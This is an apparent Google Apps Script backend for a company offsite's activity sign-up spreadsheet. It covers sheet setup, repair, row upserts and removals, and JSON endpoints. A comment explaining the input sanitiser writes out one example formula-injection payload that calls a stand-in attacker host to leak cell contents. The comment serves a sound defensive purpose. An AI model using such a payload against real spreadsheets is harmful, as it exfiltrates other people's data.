/**
 * @OnlyCurrentDoc
 *
 * Forces the narrow spreadsheets.currentonly scope. Without this,
 * Apps Script may grant the full spreadsheets scope, which would let
 * this script reach every spreadsheet in the owner's Drive. Do not
 * remove, and note that openById() cannot be used alongside it.
 */

/* ============================================================
   Santa Cruz Offsite 2026 — sign-up backend.

   This file is not served with the site. It lives inside the
   Google Sheet: Extensions > Apps Script, paste, save.

   Setup, once:
     1. Run > setup            builds the tab, headers, dropdown
     2. Deploy > New deployment > Web app
          Execute as:      Me
          Who has access:  Anyone
     3. Copy the /exec URL into ENDPOINT at the top of app.js

   Editing this file later does nothing on its own. Changes only
   go live via Deploy > Manage deployments > edit > New version.
   ============================================================ */

const TAB = "signups";
const HEADERS = ["updated_at", "key", "name", "activity", "seats", "can_lead", "note"];
const ACTIVITY_IDS = ["hang", "beer", "capitola", "disc", "bike", "hike"];

/* ---------------- one-time sheet setup ---------------- */
function setup() {
    const ss = SpreadsheetApp.getActive();
    const sh = ss.getSheetByName(TAB) || ss.insertSheet(TAB);

    sh.getRange(1, 1, 1, HEADERS.length).setValues([HEADERS]).setFontWeight("bold");
    sh.setFrozenRows(1);

    /* dropdown so hand-edits can't produce an activity the page ignores.
       Deliberately no insertCheckboxes() on can_lead: that writes FALSE
       into all 1000 default rows, which makes getLastRow() report 1002
       and pushes every appended sign-up below the blank region. Type
       TRUE or FALSE by hand instead; truthy_ is lenient about it. */
    sh.getRange("D2:D").setDataValidation(
        SpreadsheetApp.newDataValidation().requireValueInList(ACTIVITY_IDS, true).build()
    );

    sh.setColumnWidth(1, 160);
    sh.setColumnWidth(2, 170);
    sh.setColumnWidth(7, 340);
}

/* Run once from the editor (Run > repair) to clean up a sheet whose rows
   were appended below a block of stray checkbox values. Keeps every real
   sign-up, strips the artefacts, and rewrites the rows at the top. */
function repair() {
    const sh = sheet_();
    const width = HEADERS.length;
    const max = sh.getMaxRows();

    const all = sh.getRange(1, 1, max, width).getValues();
    const keep = all.slice(1).filter(r => String(r[1]).trim());
    /* log the rescued rows before touching anything, so that a failure
       further down is recoverable from the execution log */
    Logger.log("Recovered %s sign-up(s): %s", keep.length, JSON.stringify(keep));

    /* rewrite before clearing, never the other way round */
    sh.getRange(1, 1, 1, width).setValues([HEADERS]).setFontWeight("bold");
    if (keep.length) sh.getRange(2, 1, keep.length, width).setValues(keep);

    /* everything below the real rows gets wiped, values and the stray
       checkbox validations alike. clearDataValidations lives on Range. */
    const firstFree = keep.length + 2;
    if (firstFree <= max) {
        sh.getRange(firstFree, 1, max - firstFree + 1, width)
            .clearContent()
            .clearDataValidations();
    }

    sh.setFrozenRows(1);
    sh.getRange("D2:D").setDataValidation(
        SpreadsheetApp.newDataValidation().requireValueInList(ACTIVITY_IDS, true).build()
    );

    Logger.log("Kept %s sign-up(s). Data now ends at row %s.", keep.length, lastDataRow_());
}

/* Run this from the editor (Run > whichSheet) when rows seem to be
   going nowhere. It prints the spreadsheet this script is actually
   bound to, which is not always the one you have open. */
function whichSheet() {
    const ss = SpreadsheetApp.getActive();
    const tabs = ss.getSheets().map(s => s.getName() + " (" + s.getLastRow() + " rows)");
    Logger.log("Spreadsheet: %s", ss.getName());
    Logger.log("URL:         %s", ss.getUrl());
    Logger.log("Tabs:        %s", tabs.join(", "));
    Logger.log("Reading tab: %s", TAB);
    Logger.log("Roster now:  %s", JSON.stringify(roster_()));
}

/* ---------------- helpers ---------------- */
function sheet_() {
    const sh = SpreadsheetApp.getActive().getSheetByName(TAB);
    if (!sh) throw new Error('No tab named "' + TAB + '". Run setup() first.');
    return sh;
}

function json_(obj) {
    return ContentService.createTextOutput(JSON.stringify(obj))
        .setMimeType(ContentService.MimeType.JSON);
}

/* Last row holding an actual sign-up, judged only by the key column.
   getLastRow() counts any cell with a value, including stray formatting
   artefacts in other columns, so it cannot be trusted to place a write. */
function lastDataRow_() {
    const sh = sheet_();
    const max = sh.getMaxRows();
    if (max < 2) return 1;
    const keys = sh.getRange(2, 2, max - 1, 1).getValues();
    for (let i = keys.length - 1; i >= 0; i--) {
        if (String(keys[i][0]).trim()) return i + 2;
    }
    return 1;
}

function rows_() {
    const last = lastDataRow_();
    if (last < 2) return [];
    return sheet_().getRange(2, 1, last - 1, HEADERS.length).getValues();
}

/* a checkbox gives a boolean, a hand-typed cell gives a string */
function truthy_(v) {
    if (v === true) return true;
    const s = String(v).trim().toLowerCase();
    return s === "true" || s === "yes" || s === "y" || s === "1";
}

function clean_(v, max) {
    const s = String(v == null ? "" : v).trim();
    /* setValues turns a leading = into a live formula, so a submitted name
       of =IMAGE("http://attacker/?x="&A2) would run when the sheet is
       opened and leak cell contents. Strip it; no real name starts with =. */
    const safe = s.replace(/^=+/, "");
    return safe ? safe.slice(0, max) : "";
}

/* the exact shape app.js renders: { activityId: [person, ...] } */
function roster_() {
    const out = {};
    rows_().forEach(r => {
        const key = clean_(r[1], 120);
        const activity = clean_(r[3], 40);
        if (!key || ACTIVITY_IDS.indexOf(activity) === -1) return;
        if (!out[activity]) out[activity] = [];
        out[activity].push({
            key: key,
            name: clean_(r[2], 80) || null,
            seats: Math.max(0, Math.min(12, Number(r[4]) || 0)),
            canLead: truthy_(r[5]),
            note: clean_(r[6], 220) || null
        });
    });
    return out;
}

/* Sheet row number for this person, or 0. Matches on key, then falls
   back to name so renaming someone in the sheet doesn't hand them a
   second row the next time they touch the page. */
function findRow_(key, name) {
    const data = rows_();
    const k = clean_(key, 120).toLowerCase();
    const n = clean_(name, 80).toLowerCase();

    for (let i = 0; i < data.length; i++) {
        if (clean_(data[i][1], 120).toLowerCase() === k) return i + 2;
    }
    if (n) {
        for (let i = 0; i < data.length; i++) {
            if (clean_(data[i][2], 80).toLowerCase() === n) return i + 2;
        }
    }
    return 0;
}

/* ---------------- writes ---------------- */
function upsert_(body) {
    const activity = clean_(body.activity, 40);
    if (ACTIVITY_IDS.indexOf(activity) === -1) throw new Error("Unknown activity: " + activity);

    const key = clean_(body.key, 120);
    if (!key) throw new Error("Missing key.");

    const row = [
        new Date(),
        key,
        clean_(body.name, 80),
        activity,
        Math.max(0, Math.min(12, Number(body.seats) || 0)),
        !!body.canLead,
        clean_(body.note, 220)
    ];

    const sh = sheet_();
    /* not appendRow: it lands after the last cell with any value at all,
       which strands sign-ups a thousand rows down if another column has
       whole-column formatting */
    const at = findRow_(key, body.name) || lastDataRow_() + 1;
    if (at > sh.getMaxRows()) sh.insertRowsAfter(sh.getMaxRows(), 50);
    sh.getRange(at, 1, 1, HEADERS.length).setValues([row]);
}

function remove_(body) {
    const at = findRow_(body.key, body.name);
    if (at) sheet_().deleteRow(at);
}

/* ---------------- endpoints ---------------- */
function doGet() {
    try {
        return json_({ ok: true, signups: roster_() });
    } catch (err) {
        return json_({ ok: false, error: String(err.message || err) });
    }
}

function doPost(e) {
    const lock = LockService.getScriptLock();
    /* 50 people may hit this at once, and every write is a
       read-modify-write against the same rows */
    try {
        lock.waitLock(20000);
    } catch (err) {
        return json_({ ok: false, error: "Sheet busy, try again." });
    }

    try {
        const body = JSON.parse(e.postData.contents);
        if (body.action === "leave") remove_(body);
        else upsert_(body);
        SpreadsheetApp.flush();
        return json_({ ok: true, signups: roster_() });
    } catch (err) {
        return json_({ ok: false, error: String(err.message || err) });
    } finally {
        lock.releaseLock();
    }
}
